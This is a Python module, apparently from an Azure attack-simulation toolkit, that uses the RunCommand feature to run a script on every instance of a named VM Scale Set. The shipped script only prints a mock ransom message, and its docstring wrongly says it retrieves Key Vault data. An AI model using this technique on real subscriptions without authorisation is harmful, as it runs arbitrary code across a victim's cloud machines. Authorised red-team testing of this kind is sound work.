'''
Module Name : VMss_Run_Command
Module Description : Exploit the 'RunCommand' feature on a Virtual Machine Scale Set to execute arbitrary scripts or commands
'''

from azure.mgmt.compute import ComputeManagementClient
from core.AzureFunctions import GetAzureAuthCredential, GetCurrentSubscriptionAccessInfo

def TechniqueMain(subscription_id, resource_group_name, vmss_name):
  '''Function to retrieve Key Vault data'''
  
  if resource_group_name in ["", None]:
    return False, {"Error" : "Invalid input : Resource Group Name required"}, None
  if vmss_name in ["", None]:
    return False, {"Error" : "Invalid input : VMss Name required"}, None

  if subscription_id in ["", None]:
      current_sub_info = GetCurrentSubscriptionAccessInfo()
      subscription_id = current_sub_info.get("id")
  
  try:
    credential = GetAzureAuthCredential()
    compute_client = ComputeManagementClient(credential, subscription_id)
    
    vmss = compute_client.virtual_machine_scale_sets.get(resource_group_name, vmss_name)
    os_type = vmss.virtual_machine_profile.storage_profile.os_disk.os_type
    orchestration_mode = vmss.orchestration_mode
    vm_instances = compute_client.virtual_machine_scale_set_vms.list(resource_group_name, vmss.name)
    
    if (os_type == "Windows"):
      run_command_parameters = {
        'command_id': 'RunPowerShellScript',
        'script': [
            "Write-Output 'Hello, this is the TA, I have compromised you! Please send me a lot of money'"
        ]}
    else:
      run_command_parameters = {
        'command_id': 'RunShellScript',
        'script': [
            "echo 'Hello, this is the TA, I have compromised you! Please send me a lot of money'"
        ]}

    response = {}
    for vm_instance in vm_instances:
      if (orchestration_mode == "Flexible"):
        response[vm_instance.name] = compute_client.virtual_machines.begin_run_command(
          resource_group_name,
          vm_instance.name,
          run_command_parameters
        )
      else:
        response[vm_instance.name] = compute_client.virtual_machine_scale_set_vms.begin_run_command(
          resource_group_name,
          vmss.name,
          vm_instance.instance_id,
          run_command_parameters
        )
        
    
    pretty_response = {
      "Success": {
        "message": f"Script executed on all instances inside the {vmss_name} VMss",
      }
    }
    return True, response, pretty_response
    
  except Exception as e:
    return False, {"Error" : e}, None

def TechniqueInputSrc() -> list:
  '''Returns the input fields required as parameters for the technique execution'''
  return [
    {
      "title": "Subscription ID (Optional)",
      "id": "subscription-id-text-input",
      "type": "text",
      "placeholder": "1234-5678-9098-7654-3210",
      "element_type": "dcc.Input"
    },
    {
      "title": "Resource Group Name", 
      "id": "resource-group-name",
      "type": "text",
      "placeholder": "example-vmss-resource-group",
      "element_type": "dcc.Input"
    },
    {
      "title": "VMss Name", 
      "id": "vmss-name",
      "type": "text",
      "placeholder": "example-vmss-name",
      "element_type": "dcc.Input"
    }
  ]